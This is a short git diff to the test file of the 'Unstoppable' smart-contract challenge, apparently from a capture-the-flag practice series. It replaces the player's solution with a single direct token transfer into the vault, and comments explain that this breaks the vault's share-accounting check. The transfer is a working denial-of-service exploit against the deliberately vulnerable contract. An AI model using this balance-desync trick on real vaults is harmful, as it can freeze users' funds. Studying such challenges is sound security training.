@@ -44,13 +44,13 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
+
         // condition convertToShares(totalSupply) != balanceBefore in UnstoppableVault makes no sense
         // totalSupply is the total number of shares
         // when balance goes up convertToShares(totalSupply) goes down because there are more assets per share
-        tokenPlayer = token.connect(player);
-        expect(await vault.totalAssets()).to.eq(await vault.convertToShares(await vault.totalSupply())); 
-        await tokenPlayer.transfer(vault.address, 10n ** 18n);
-        expect(await vault.totalAssets()).to.not.eq(await vault.convertToShares(await vault.totalSupply()));
+        
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
+
     });
 
     after(async function () {
